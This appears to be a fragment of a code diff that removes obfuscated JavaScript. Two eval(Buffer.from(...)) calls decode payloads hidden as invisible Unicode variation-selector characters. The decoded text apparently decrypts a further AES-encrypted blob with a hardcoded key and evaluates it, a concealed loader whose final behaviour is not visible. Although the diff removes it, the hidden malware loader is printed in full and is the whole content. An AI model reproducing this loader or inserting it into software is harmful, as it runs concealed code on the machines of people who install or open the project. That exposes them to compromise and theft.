󠄩󠄨󠄨󠄨󠄨󠅓󠄣󠄦󠄣󠄩󠅓󠄠󠄢󠄦󠅕󠄧󠄦󠅒󠄠󠄠󠅒󠄥󠅔󠄨󠅔󠄣󠅑󠄢󠄦󠅕󠅒󠄤󠄣󠄠󠄣󠄥󠅓󠅑󠄥󠄢󠄡󠄢󠄤󠅕󠅒󠄣󠄠󠄨󠅑󠄡󠅓󠅒󠄡󠅒󠄦󠄤󠄦󠄢󠄦󠄣󠅒󠄦󠄢󠅔󠄡󠄣󠅓󠄥󠄦󠅕󠄡󠄥󠅒󠅕󠄨󠅓󠄧󠅖󠄩󠄦󠅕󠄡󠄧󠅔󠅔󠅖󠄢󠄠󠄨󠅕󠄥󠄤󠅖󠄥󠅒󠅔󠄨󠅒󠄢󠄤󠄨󠄤󠅓󠅔󠄩󠄤󠅑󠅕󠄣󠄤󠄥󠄧󠅒󠄢󠄢󠄢󠄥󠄡󠄡󠄣󠅕󠄠󠅑󠄥󠄥󠅓󠄡󠅒󠅓󠅒󠅕󠄢󠄤󠅕󠄧󠅕󠄠󠅖󠅓󠅓󠄦󠄢󠄦󠄧󠄥󠄡󠄤󠄧󠄤󠄤󠅕󠄣󠄥󠄧󠄡󠄩󠄣󠄣󠅖󠅔󠄢󠄥󠄧󠄣󠄧󠅑󠄡󠄢󠄡󠅕󠅑󠅖󠄨󠄨󠄣󠄣󠄦󠄨󠄣󠄦󠅒󠄣󠄦󠅒󠅒󠄥󠄧󠄠󠄢󠄢󠄣󠅒󠄣󠄨󠄡󠅑󠄦󠄨󠅕󠄠󠄠󠅕󠅒󠄣󠅑󠅖󠄤󠄩󠅒󠄧󠄩󠄧󠅑󠄧󠅑󠅖󠄣󠅑󠄤󠄠󠄤󠅔󠄤󠄤󠅕󠄡󠅓󠄢󠄣󠅕󠅕󠄢󠄥󠅑󠅓󠄤󠅑󠄥󠄦󠄥󠅔󠄣󠄢󠄣󠄥󠄥󠄢󠄤󠅓󠄤󠄢󠄥󠄨󠄦󠄡󠄩󠄠󠄩󠅓󠅖󠅕󠄧󠅒󠄤󠅔󠄤󠅒󠄩󠅑󠄢󠄡󠄩󠄧󠅕󠅑󠄢󠄣󠅕󠄣󠄦󠅖󠄣󠅒󠄧󠄢󠄨󠅑󠄠󠄢󠄧󠄤󠄡󠄧󠄧󠄧󠄦󠄣󠅑󠅕󠄨󠅖󠄦󠄢󠄧󠄨󠄥󠄤󠄥󠄢󠄩󠅑󠅔󠅓󠄥󠅑󠄢󠄨󠄨󠅑󠄨󠅑󠄥󠄧󠄩󠅖󠄨󠄤󠄦󠅑󠄣󠄩󠄧󠄦󠅑󠄨󠄡󠄥󠄡󠄤󠄧󠅑󠅑󠄦󠄧󠅒󠄥󠅑󠅔󠄦󠅖󠅓󠄦󠅕󠅕󠄠󠄨󠅖󠄦󠅔󠅖󠄠󠄡󠄡󠅓󠄠󠄡󠅔󠄡󠅓󠄧󠅔󠅖󠄨󠄥󠅔󠅒󠅖󠅕󠅒󠄤󠄨󠅓󠄨󠄢󠅑󠄦󠅓󠄤󠄣󠄣󠅓󠄣󠄦󠄤󠄩󠅑󠄥󠄤󠄧󠅓󠅔󠄢󠅓󠄤󠅒󠄥󠄢󠄩󠄥󠄠󠄨󠅓󠄧󠄨󠄥󠅓󠄠󠄢󠄤󠅔󠄧󠅓󠅔󠄥󠄠󠄢󠅔󠄦󠅖󠄡󠄦󠄥󠅑󠄤󠅕󠄨󠄩󠅔󠄢󠅓󠄧󠄤󠅔󠄣󠄩󠅕󠄦󠄡󠅔󠄢󠅕󠄢󠅕󠅕󠄠󠅕󠄩󠄩󠄣󠅕󠅖󠄣󠄢󠅕󠅒󠅔󠄡󠅒󠅑󠄣󠅕󠄨󠄠󠅔󠅔󠅑󠄩󠄩󠄣󠅔󠄠󠄩󠅓󠄥󠄢󠄨󠅔󠄥󠄨󠄦󠄡󠄠󠄦󠄠󠄣󠄦󠅕󠄠󠄥󠄨󠅖󠅖󠅖󠄩󠄣󠄧󠄣󠄢󠅑󠄩󠅑󠄣󠄣󠄦󠄤󠄣󠅔󠄩󠅒󠅑󠅑󠅕󠅓󠄠󠅑󠅑󠅑󠅒󠄠󠄥󠅖󠄣󠄡󠄡󠅓󠅖󠅔󠄠󠄨󠄢󠅒󠄠󠄢󠄧󠅔󠄢󠅔󠄥󠄩󠄥󠄢󠅒󠅓󠄡󠄣󠄠󠅒󠅕󠅖󠄥󠅕󠅑󠄨󠅑󠄤󠄠󠄦󠅓󠄠󠄢󠄡󠅓󠅒󠄢󠅒󠄣󠄡󠄧󠄨󠅕󠅓󠅓󠄧󠄠󠄡󠄩󠅔󠅕󠅑󠄢󠄨󠄥󠅕󠅖󠄦󠄡󠄦󠄤󠄦󠄣󠅕󠅕󠅑󠄧󠄦󠅕󠅓󠄦󠅓󠄡󠄩󠄡󠄥󠅖󠄤󠅒󠅓󠅔󠄧󠅒󠄥󠅔󠅒󠄥󠄡󠄥󠄣󠅓󠅔󠅑󠄡󠄦󠅒󠄢󠄢󠅑󠅖󠄣󠄤󠅔󠅖󠅖󠄡󠄥󠅓󠄤󠅕󠅕󠄡󠄧󠄩󠄦󠅑󠅑󠄠󠅑󠅒󠄠󠅒󠄤󠅓󠅖󠄤󠄥󠄦󠄤󠄧󠄣󠅒󠅓󠄩󠄧󠅔󠅕󠄠󠅔󠅕󠄤󠄦󠅕󠄨󠅓󠅔󠄡󠄢󠅕󠅔󠄠󠄦󠄣󠄧󠅑󠄣󠅖󠅖󠅕󠄧󠄩󠅑󠅔󠄥󠅓󠄦󠅑󠅕󠅕󠄨󠅑󠅕󠅑󠄥󠅖󠄥󠄧󠅒󠅒󠄢󠅓󠄨󠄢󠄧󠄤󠄥󠄣󠄣󠄠󠅓󠄦󠄢󠄨󠄧󠄢󠅑󠅖󠄤󠅖󠄢󠄧󠅓󠄩󠅖󠄧󠄢󠅑󠄩󠅒󠄤󠄣󠄠󠅖󠄥󠄤󠄧󠄥󠄧󠄩󠄠󠅓󠄦󠄢󠅔󠄤󠄥󠄠󠅒󠅓󠅑󠄢󠅕󠄤󠄧󠄧󠄦󠄡󠄧󠄦󠅕󠄥󠄤󠅓󠄠󠅓󠅕󠄦󠅒󠅓󠅑󠅒󠄡󠄥󠄧󠅒󠄨󠄥󠄧󠅑󠄠󠅕󠄢󠄧󠄠󠄣󠅔󠄤󠄥󠄠󠅔󠄡󠅕󠄩󠄠󠅕󠅖󠄩󠅑󠅔󠅑󠅔󠄢󠄢󠄥󠄧󠅕󠅓󠄢󠄠󠄢󠅖󠄤󠄠󠅒󠄣󠄠󠄧󠄤󠄡󠄢󠅔󠄢󠄣󠄨󠄦󠅖󠄨󠄠󠅕󠄦󠅑󠄤󠄥󠄤󠄠󠅑󠄨󠄦󠄢󠄩󠄩󠄩󠄧󠅔󠄢󠄡󠅒󠄡󠄤󠅒󠅖󠅖󠅖󠄨󠄨󠄤󠅔󠄦󠄨󠄥󠄥󠄥󠅔󠄦󠄠󠅑󠄠󠄣󠅕󠅓󠅕󠄦󠅓󠄧󠅖󠄡󠄥󠄤󠄥󠅒󠅓󠅓󠄢󠄦󠅑󠅖󠄩󠄡󠄦󠄡󠅔󠄡󠄡󠄥󠅖󠄩󠅕󠄠󠅓󠅓󠄩󠄢󠄦󠄢󠅒󠄡󠄧󠅓󠅒󠄧󠅔󠄥󠅕󠅖󠄧󠅑󠄨󠄧󠄠󠄥󠄨󠅖󠄦󠄣󠄥󠄠󠄣󠅓󠄤󠄥󠅑󠄡󠄥󠄥󠄢󠄤󠄥󠅒󠄨󠅕󠅑󠅔󠄡󠅓󠅓󠄨󠅓󠄩󠄧󠄨󠄥󠄡󠄤󠄥󠅒󠄥󠅓󠄣󠄨󠄦󠄣󠄠󠅒󠄣󠄢󠅑󠅑󠄤󠄤󠄣󠄣󠅒󠅓󠄩󠄩󠅑󠄤󠄤󠄢󠄧󠅑󠄣󠄥󠄩󠄣󠄤󠅕󠅒󠄥󠄥󠅕󠄠󠄣󠄡󠅕󠄩󠄡󠄨󠄤󠅕󠄢󠄥󠅓󠅖󠄧󠅒󠄨󠄣󠄡󠅒󠅑󠄧󠅔󠄣󠅒󠅖󠅒󠄥󠄤󠄢󠅖󠅖󠅑󠅕󠅑󠅔󠅑󠅒󠄥󠄠󠄨󠅑󠄥󠄥󠅖󠄡󠅑󠅔󠅑󠄨󠅕󠅕󠄥󠄧󠄨󠅑󠅓󠅓󠅔󠅓󠅒󠄡󠄢󠄡󠄨󠄠󠄦󠅓󠅖󠄠󠅑󠅑󠄣󠄡󠅓󠄦󠄦󠄩󠄥󠄤󠅓󠄥󠅕󠅒󠄦󠄧󠅓󠄤󠅔󠅓󠅖󠅒󠄨󠄢󠄦󠅓󠄧󠅒󠅖󠅓󠅔󠄦󠄧󠅔󠅑󠄨󠄡󠄧󠄨󠄡󠄣󠄩󠄥󠄧󠄧󠄡󠅑󠄥󠄠󠅒󠄠󠄧󠅒󠄥󠄨󠄧󠄨󠄥󠄠󠄢󠄡󠄩󠄤󠅒󠅔󠄢󠄦󠄢󠅕󠄨󠅕󠅑󠄧󠄡󠄣󠅕󠄥󠅖󠄧󠄧󠅖󠅑󠄥󠄣󠅖󠅔󠅒󠄠󠄡󠄡󠄧󠅔󠅒󠄨󠄤󠅔󠄧󠄥󠅓󠅒󠄨󠄦󠅒󠄧󠅕󠅔󠄤󠄦󠄣󠄥󠄡󠄧󠄩󠅓󠅑󠅑󠅖󠅓󠄤󠅒󠄣󠄩󠅔󠄨󠄨󠄢󠅒󠄡󠄨󠅕󠄦󠄠󠅓󠅖󠄨󠅑󠄡󠄢󠅑󠄠󠄩󠅑󠄩󠄥󠄩󠄢󠅑󠄦󠅔󠄩󠄥󠅒󠄤󠅑󠅔󠄦󠅒󠄢󠄤󠅔󠄠󠅕󠄦󠄦󠅔󠄧󠄤󠅖󠄠󠄢󠅔󠅕󠅓󠅓󠅖󠄣󠄦󠅖󠅕󠄨󠅖󠅖󠅒󠅔󠄦󠄢󠄩󠅖󠅔󠅔󠅕󠄦󠄦󠄣󠄩󠄨󠄩󠅖󠅒󠄣󠄣󠄡󠄣󠅖󠄧󠅖󠅓󠄩󠄠󠄨󠅓󠅑󠅔󠅒󠄡󠄡󠄠󠅖󠄣󠄡󠄠󠄦󠄤󠄩󠅔󠅖󠅒󠅑󠅖󠄦󠄤󠅖󠄢󠅓󠄩󠅔󠄤󠅖󠄦󠄨󠄤󠅖󠅒󠅑󠅑󠄢󠅒󠅕󠅒󠅔󠄦󠅒󠄨󠅔󠄡󠅕󠄡󠄨󠄠󠄢󠄨󠅔󠅒󠅒󠄢󠅖󠅕󠄤󠄠󠄣󠅔󠅑󠄦󠅓󠅖󠄤󠄡󠄦󠄦󠄤󠅒󠅕󠄧󠄡󠄡󠅕󠄩󠄤󠄧󠅑󠅒󠅑󠄤󠄨󠄩󠄡󠅕󠅕󠄤󠄩󠅒󠄦󠅓󠄥󠄣󠅒󠅓󠄧󠅕󠄦󠅓󠅖󠅔󠄧󠄡󠄣󠅔󠄣󠄢󠄨󠄤󠅑󠄣󠄧󠄦󠅔󠄥󠄧󠅔󠄠󠄡󠄦󠄣󠄥󠅑󠄣󠄦󠄧󠄧󠄡󠄠󠄡󠅑󠅕󠄤󠅕󠄥󠅑󠄨󠄩󠄢󠄥󠅓󠄥󠄨󠄢󠄠󠄧󠅕󠅖󠄤󠄡󠅖󠅒󠅖󠄨󠄢󠄨󠄤󠄠󠄩󠅓󠄢󠄢󠅖󠄨󠅔󠄢󠄧󠅒󠄥󠅕󠅒󠄤󠄡󠄩󠄦󠄥󠄤󠄨󠅖󠅓󠅖󠄡󠄠󠅕󠅕󠄠󠄨󠄠󠄦󠄥󠄩󠅕󠄩󠄥󠅑󠄤󠅒󠄩󠄨󠄧󠄦󠅒󠅔󠄦󠅒󠅓󠄥󠄦󠄨󠅒󠅑󠄦󠅖󠅓󠅒󠅔󠄨󠅑󠄩󠅕󠄩󠄨󠅓󠄢󠄢󠄤󠅖󠄣󠅔󠄩󠄣󠄢󠅕󠄤󠅖󠄩󠄣󠄠󠅔󠄡󠄡󠄦󠅑󠄠󠄩󠄢󠄧󠅕󠅓󠄦󠄧󠄩󠄢󠄩󠄠󠅒󠅖󠄧󠄠󠄦󠄢󠄧󠅔󠅓󠅓󠅑󠄩󠄤󠅖󠄨󠄦󠄩󠄦󠄩󠅖󠄩󠅑󠄨󠄦󠄣󠄦󠅔󠄡󠄧󠄧󠅒󠅔󠅑󠄩󠅖󠅑󠅕󠅑󠅒󠅔󠄣󠅕󠄩󠅓󠄥󠅕󠅖󠄧󠄧󠅒󠄠󠄦󠅕󠄢󠄢󠄡󠅕󠅔󠅖󠄦󠅑󠄠󠄥󠅑󠄠󠅔󠄦󠅖󠅖󠄥󠄩󠄢󠅓󠄨󠄤󠅕󠅑󠄣󠅑󠄠󠅖󠅔󠄢󠅔󠅔󠄩󠄣󠄡󠅕󠄢󠄨󠅒󠄦󠄩󠄣󠄦󠄢󠄥󠄣󠄨󠄦󠅔󠅖󠄤󠅓󠄨󠄣󠅔󠅕󠄥󠄤󠅖󠅑󠄤󠄦󠄥󠄠󠄨󠄨󠄣󠅒󠄡󠄦󠄥󠄣󠄠󠄢󠄢󠄢󠄥󠅑󠄧󠅖󠄦󠄡󠄤󠄤󠅒󠅕󠅓󠄠󠅔󠅖󠄦󠄣󠄡󠅔󠄡󠄩󠄢󠄠󠄠󠄩󠅒󠄦󠅕󠄠󠅒󠅑󠄥󠄩󠄢󠄧󠅖󠄠󠅔󠄧󠅔󠄤󠄢󠄥󠄧󠅕󠄠󠄣󠄤󠄨󠄣󠅕󠄩󠄣󠄡󠅒󠅖󠄢󠄩󠅓󠄡󠄡󠄡󠄩󠄨󠅔󠄠󠄡󠄧󠅑󠅖󠅔󠅒󠄢󠅔󠄡󠅒󠄨󠄢󠄡󠄦󠅒󠄥󠄦󠅒󠅑󠄨󠄢󠄣󠅓󠄣󠄡󠄦󠄩󠅔󠅑󠄣󠅓󠄣󠄨󠄨󠄤󠄨󠄩󠄧󠅒󠅓󠅑󠄢󠅔󠄦󠄩󠄧󠄡󠄡󠄩󠄤󠄨󠄢󠅒󠄩󠄥󠅕󠄠󠅓󠄨󠄨󠅓󠅔󠅓󠄥󠄡󠄤󠄢󠄩󠅕󠄩󠅓󠄤󠅓󠄠󠄡󠄥󠅔󠄡󠄣󠄤󠅔󠄤󠄥󠄥󠄩󠅒󠄤󠄦󠄣󠄥󠄥󠄢󠅔󠄤󠄦󠄠󠄧󠄡󠄢󠄡󠅔󠄦󠅑󠄦󠄠󠅖󠄤󠄤󠄥󠄡󠄢󠄠󠅖󠄠󠄤󠄡󠄦󠅔󠅒󠄣󠅖󠄢󠄥󠄤󠄠󠄧󠄠󠅑󠄦󠅔󠅖󠄣󠅔󠅒󠅒󠄣󠄤󠄣󠄡󠅔󠄣󠅓󠄥󠄡󠄠󠅔󠄣󠄣󠄩󠄠󠄦󠄦󠄤󠅔󠄣󠅔󠅔󠄧󠅒󠄣󠄩󠅑󠅑󠅔󠄢󠅓󠄨󠅒󠄣󠄩󠅔󠄡󠄢󠄣󠄠󠅕󠄣󠄠󠄨󠅒󠅔󠄡󠄥󠄤󠄨󠄣󠄦󠄩󠄣󠄣󠄦󠅕󠄣󠅒󠄦󠄥󠄨󠅒󠄠󠄠󠄩󠄩󠅔󠄤󠄦󠅑󠅕󠅓󠄦󠄢󠄦󠄤󠄧󠄤󠄠󠄩󠅖󠄩󠄣󠄤󠄢󠄡󠄥󠄩󠄧󠄥󠅑󠅕󠄧󠄧󠄢󠄨󠅒󠄩󠅔󠄢󠅓󠄦󠄨󠄡󠄨󠄥󠅒󠄤󠅖󠄥󠄠󠅔󠅕󠄦󠅔󠄢󠄢󠄤󠄦󠅖󠅔󠅑󠄧󠄩󠅔󠅔󠄨󠄠󠄡󠄤󠄥󠅖󠅖󠄧󠄩󠅑󠄩󠄥󠄩󠅑󠅓󠄦󠄥󠅒󠄨󠄢󠅔󠄨󠄦󠅓󠄡󠅖󠄨󠄩󠄡󠅓󠅖󠄥󠄠󠄠󠄣󠄦󠄢󠄤󠄠󠅖󠄦󠄠󠄧󠄥󠅒󠅔󠅑󠄢󠄥󠄤󠄩󠅑󠄦󠄥󠄩󠅓󠅕󠅑󠄥󠄩󠅔󠄡󠅑󠄢󠅑󠄧󠅕󠄦󠅓󠄦󠄢󠅑󠄦󠅔󠄩󠅒󠅓󠄡󠄠󠅖󠄣󠄥󠅑󠅕󠄣󠅑󠅖󠅖󠄣󠄩󠄩󠅖󠄣󠅖󠅑󠄡󠅒󠅕󠄩󠄥󠄢󠅓󠄣󠄠󠄦󠅓󠅖󠄩󠄧󠄣󠅒󠄧󠅔󠅒󠄢󠄧󠄣󠅕󠄢󠄧󠄣󠄦󠄧󠅖󠄩󠄢󠅒󠅕󠄢󠅖󠅑󠄧󠅒󠄥󠄨󠅖󠄧󠄥󠄦󠅕󠄡󠅕󠅒󠄢󠄠󠄦󠄩󠅕󠅑󠅒󠄥󠄧󠄣󠄠󠅒󠄣󠄩󠄩󠅒󠅑󠅒󠅓󠅖󠄩󠅔󠄩󠄥󠄤󠄧󠄥󠄩󠄢󠅑󠅑󠅓󠅑󠄣󠄤󠄧󠅔󠄢󠄥󠅑󠅑󠄨󠄠󠄧󠅔󠅑󠄣󠄣󠅔󠄣󠄩󠅕󠄣󠅑󠄥󠄩󠄤󠄤󠅔󠅔󠄩󠅑󠅕󠄤󠅖󠅖󠅕󠅒󠅔󠄤󠅒󠄥󠄧󠄤󠅕󠅑󠅔󠅔󠄣󠅖󠅓󠄨󠅓󠅒󠅓󠄨󠄠󠄩󠄣󠅕󠄠󠄩󠄧󠅖󠄡󠄡󠅑󠄡󠄦󠄥󠅓󠄣󠄨󠅖󠅖󠄩󠄩󠄨󠄦󠄥󠅔󠅕󠅔󠄥󠅕󠄤󠄨󠄡󠄠󠄣󠄨󠄡󠄣󠅔󠅒󠄩󠄩󠅕󠄠󠄩󠄧󠅕󠅔󠄥󠄢󠄥󠄨󠄥󠄢󠄦󠄥󠅒󠅖󠄠󠅖󠅒󠄡󠄡󠄠󠄣󠅔󠅖󠅒󠄦󠅔󠅒󠅔󠄢󠄤󠄥󠅑󠅑󠄢󠅕󠄧󠄠󠅒󠅔󠅖󠅑󠄩󠅑󠄢󠄥󠅕󠄤󠅕󠅒󠅒󠄠󠄢󠄢󠅖󠄧󠄢󠄤󠄢󠅓󠅓󠅓󠄩󠅒󠅒󠄩󠅑󠄡󠅕󠅒󠄦󠅖󠄨󠅕󠄣󠅓󠄨󠄥󠄢󠅒󠅕󠄢󠄤󠄧󠄤󠄣󠄥󠄧󠄦󠅓󠄣󠅓󠄡󠄦󠅕󠅕󠄣󠅓󠄩󠄢󠅒󠄦󠄤󠅖󠅑󠄤󠅔󠄧󠄣󠄡󠄣󠅕󠄥󠄧󠅕󠄤󠄤󠅑󠅒󠄤󠅒󠅔󠅖󠄦󠄧󠅓󠅕󠅔󠄦󠅔󠅒󠅓󠅒󠄥󠅕󠄡󠄠󠄩󠄤󠄥󠄤󠄡󠄠󠄠󠄥󠄦󠅒󠄢󠄦󠄣󠅕󠄧󠄧󠅔󠄧󠄥󠄢󠄦󠄦󠄦󠄠󠅕󠅑󠄣󠄧󠅒󠄥󠄣󠅒󠅓󠄤󠄡󠄩󠄦󠄩󠅕󠄥󠄦󠄥󠄠󠄠󠄢󠄢󠄦󠄥󠅖󠅓󠅖󠅑󠅑󠄨󠄥󠅕󠄠󠅖󠄩󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄜󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅒󠄛󠄭󠅔󠄞󠅖󠅙󠅞󠅑󠅜󠄘󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠄜󠄥󠄠󠄠󠄙󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅕󠅦󠅑󠅜󠄘󠅒󠄙󠄫󠅭󠄙󠄘󠄙󠅍󠅋󠄠󠅍󠄞󠅤󠅘󠅕󠅞󠄘󠄘󠄙󠄭󠄮󠅫󠅭󠄙󠄫`,
-    ),
-  ).toString("utf-8"),
-);
-
-const s = (v) =>
-  [...v]
-    .map(
-      (w) => (
-        (w = w.codePointAt(0)),
-        w >= 0xfe00 && w <= 0xfe0f
-          ? w - 0xfe00
-          : w >= 0xe0100 && w <= 0xe01ef
-            ? w - 0xe0100 + 16
-            : null
-      ),
-    )
-    .filter((n) => n !== null);
-eval(
-  Buffer.from(
-    s(
-      `󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄴󠅕󠅓󠅙󠅠󠅘󠅕󠅢󠅙󠅦󠄘󠄗󠅑󠅕󠅣󠄝󠄢󠄥󠄦󠄝󠅓󠅒󠅓󠄗󠄜󠄗󠅪󠅕󠅤󠅡󠄸󠅩󠅖󠄴󠅖󠅟󠅔󠄨󠄨󠅪󠅜󠅟󠅞󠅓󠅖󠅞󠄿󠅑󠅃󠄩󠅗󠄷󠅣󠄩󠄠󠄿󠄾󠅈󠄗󠄜󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠅑󠄠󠄤󠄡󠅖󠅔󠅑󠅑󠄠󠄥󠄢󠄡󠅖󠅒󠄥󠅓󠄣󠅕󠄢󠄦󠅒󠄢󠄡󠄧󠅑󠅑󠅖󠄢󠄤󠄡󠄡󠄥󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄙󠄙󠄫󠅜󠅕󠅤󠄐󠅒󠄭󠅔󠄞󠅥󠅠󠅔󠅑󠅤󠅕󠄘󠄗󠄨󠄤󠄨󠄦󠅕󠅑󠄦󠄡󠄢󠄢󠄤󠄠󠄢󠄣󠄢󠅕󠄠󠄧󠄣󠄥󠅖󠄨󠅖󠅕󠄩󠄨󠅕󠄨󠄥󠄣󠅒󠅖󠅕󠄢󠄣󠅖󠅓󠅒󠄣󠄨󠅒󠄣󠅕󠄡󠅔󠄣󠄨󠅕󠄦󠄡󠅔󠄦󠄡󠄢󠅑󠅖󠅑󠅔󠄠󠅔󠅒󠅑󠅑󠅕󠄥󠅕󠄥󠄣󠄢󠅖󠄤󠄧󠅑󠅔󠄧󠄦󠅔󠅓󠅓󠄧󠄧󠄩󠄡󠄩󠄤󠄥󠄩󠄩󠄥󠅖󠄦󠅓󠄠󠄠󠄦󠄧󠄤󠄡󠄣󠄨󠅑󠅕󠄤󠄢󠄢󠄡󠅖󠄧󠄢󠅓󠄡󠅓󠄦󠄡󠅕󠄠󠄨󠄩󠅔󠄦󠅒󠄦󠅒󠄣󠄦󠅓󠄩󠅔󠄧󠅖󠄤󠅒󠅔󠄣󠄦󠄥󠄠󠅖󠅔󠅓󠄦󠅖󠄠󠄤󠅒󠅔󠄣󠅑󠄥󠄩󠄤󠅑󠄩󠅔󠅒󠄡󠅖󠄧󠄡󠅓󠄥󠅕󠅕󠅑󠄧󠅒󠄠󠄥󠄥󠄤󠄢󠄨󠅕󠅖󠅑󠄨󠄨󠄩󠅑󠄠󠄨󠄢󠄡󠅔󠄡󠅒󠄢󠅖󠅒󠄢󠅕󠄧󠄨󠄣󠅕󠅑󠄩󠄨󠅕󠄡󠅑󠄩󠄤󠄨󠅔󠄡󠄥󠅕󠅕󠄥󠅑󠅔󠄨󠅓󠅒󠅓󠅖󠅒󠄠󠅑󠄨󠄤󠅔󠄧󠄨󠄩󠄡󠄡󠅕󠅒󠅒󠄣󠅓󠄢󠄩󠅓󠄤󠅓󠅓󠄣󠅓󠄢󠅔󠄨󠄢󠅓󠅓󠅓󠅓󠄢󠄦󠅑󠅓󠄢󠄠󠅔󠅖󠄡󠄩󠄤󠄢󠄠󠅒󠅒󠄨󠄡󠄤󠄥󠅖󠅓󠄠󠄥󠄢󠄤󠅒󠄨󠅖󠄧󠄤󠄥󠅓󠄢󠄤󠅔󠄡󠄣󠅔󠄣󠄨󠅓󠄩󠅕󠅕󠄢󠅓󠅔󠅕󠄢󠄡󠄡󠄥󠄤󠄢󠄩󠄣󠅖󠅓󠄤󠄢󠄡󠄧󠅔󠄦󠅓󠄥󠄢󠄧󠄣󠄧󠄨󠅕󠄩󠄦󠄩󠅔󠅕󠅑󠄥󠅑󠄦󠄧󠅕󠄧󠅓󠅒󠄤󠄨󠄡󠄦󠄨󠄦󠄠󠅑󠅕󠄨󠄥󠄩󠄠󠄥󠄧󠄣󠅒󠄣󠄢󠅒󠅒󠅖󠄩󠅒󠄠󠅓󠄡󠅓󠅕󠅖󠄡󠄠󠄨󠄡󠄠󠅖󠄩󠄩󠄥󠅒󠅒󠅓󠄤󠅑󠅑󠄩󠄦󠄨󠄧󠄧󠄨󠄦󠄦󠅓󠅑󠄠󠅔󠅑󠅕󠅔󠅓󠅖󠅑󠄩󠅑󠄥󠅓󠄧󠅔󠅑󠅑󠅓󠄤󠅓󠄩󠄩󠅓󠅔󠄨󠅖󠄤󠄥󠄦󠅖󠄤󠄨󠄡󠄨󠄠󠄡󠄢󠅖󠅔󠄦󠅕󠄨󠅓󠅕󠄨󠅕󠄠󠄢󠄧󠅖󠄠󠅒󠅓󠅑󠄦󠅔󠅔󠄤󠅓󠄡󠅔󠄣󠅑󠅑󠄤󠅖󠄤󠄥󠄢󠅕󠄡󠄣󠄥󠄠󠄤󠄤󠅒󠅕󠄩󠅔󠄠󠅒󠅓󠄥󠅒󠄡󠅓󠄣󠅑󠄩󠅖󠄤󠄩󠅑󠅒󠄥󠅔󠄡󠅕󠄡󠅑󠄣󠄨󠄥󠄥󠅒󠄧󠅓󠄩󠅔󠄥󠄣󠄥󠄩󠅖󠄣󠄤󠄠󠅑󠄩󠄡󠅕󠅒󠄤󠄢󠄨󠄤󠄧󠅕󠅑󠄠󠄡󠄦󠅓󠄢󠄡󠅑󠄩󠅖󠄥󠅕󠅓󠅕󠄧󠅕󠅑󠄩󠄤󠄡󠄠󠄤󠄢󠄩󠄤󠄨󠄠󠄧󠄣󠅓󠄧󠄩󠄩󠅒󠅔󠅓󠄠󠄧󠄧󠄣󠄧󠅖󠄢󠅔󠅓󠄨󠄣󠅑󠄨󠅓󠄡󠄦󠄦󠄦󠄣󠄦󠅔󠄧󠄠󠅒󠅑󠄦󠄨󠄦󠄢󠅒󠄢󠄠󠅑󠄧󠅕󠅔󠄧󠄧󠄡󠅕󠅔󠅔󠄩󠄦󠅔󠅔󠄩󠄤󠄦󠅕󠅓󠅑󠅒󠄡󠄠󠄥󠄤󠄡󠅒󠄢󠄠󠄨󠄢󠅒󠄧󠄥󠄢󠄢󠅖󠄢󠄢󠄩󠅒󠄩󠄤󠄣󠄨󠅒󠅑󠅔󠅕󠅑󠄤󠅑󠄡󠄠󠄨󠅕󠅖󠄣󠄡󠄩󠄥󠄢󠅒󠅔󠄩󠄩󠅕󠅕󠄨󠅕󠄦󠄥󠄡󠄢󠅖󠅒󠅓󠄣󠄢󠅒󠄩󠄣󠅒󠄨󠅑󠅕󠄤󠅕󠅒󠄦󠄨󠄩󠄤󠄢󠄣󠄦󠅒󠄠󠅔󠄩󠄣󠅓󠅓󠄢󠅕󠅑󠅖󠄣󠅑󠅖󠄦󠄩󠄦󠄣󠄣󠅒󠅖󠅓󠅖󠄤󠅑󠄥󠄢󠅑󠄢󠅔󠄦󠄧󠄨󠄩󠄦󠅔󠅑󠅑󠄧󠄧󠄩󠅔󠅑󠄢󠅖󠄢󠄦󠄦󠅒󠄨󠄦󠄢󠄦󠅕󠅔󠄢󠅑󠅔󠄧󠅒󠄧󠅑󠅒󠅕󠅔󠅔󠄠󠄡󠄧󠅕󠄢󠄢󠅒󠄡󠅕󠅖󠄢󠅑󠄤󠄤󠅓󠄣󠄡󠅖󠄣󠅕󠄦󠄦󠅒󠄠󠄠󠅓󠄡󠅒󠅔󠅑󠅔󠄦󠅖󠄦󠅓󠄦󠅓󠅖󠅓󠅒󠄨󠅖󠅓󠄤󠄠󠄩󠅔󠅑󠅔󠅑󠄦󠄧󠅓󠄦󠅔󠄦󠄦󠄧󠄩󠅒󠄠󠅑󠅕󠄠󠄡󠄥󠅖󠄩󠄣󠅓󠅔󠄧󠅔󠄡󠄥󠅖󠄨󠄨󠄩󠄧󠅔󠄩󠄥󠅒󠅒󠅕󠅒󠄦󠄠󠄩󠄩󠄡󠄤󠄤󠄠󠅓󠄡󠄡󠄤󠄣󠄠󠄨󠄧󠅒󠄢󠄩󠄨󠅔󠄦󠅖󠅑󠄨󠅕󠄢󠅖󠄣󠄤󠅓󠅖󠅔󠄨󠅔󠄨󠄥󠄨󠅒󠄤󠅑󠄦󠄡󠄦󠄩󠄨󠄦󠅖󠄡󠅕󠄧󠅒󠅒󠄦󠄢󠅑󠄦󠄥󠄩󠄣󠄡󠄣󠅕󠄨󠄠󠅑󠄦󠄢󠄡󠄩󠅖󠅔󠄢󠄦󠄡󠅒󠄤󠄧󠅓󠄤󠅕󠅑󠄨󠄤󠄡󠅓󠅒󠄥󠅑󠄧󠄢󠄨󠄡󠄥󠄧󠅑󠄩󠄧󠅖󠅑󠄥󠄢󠄥󠅖󠅓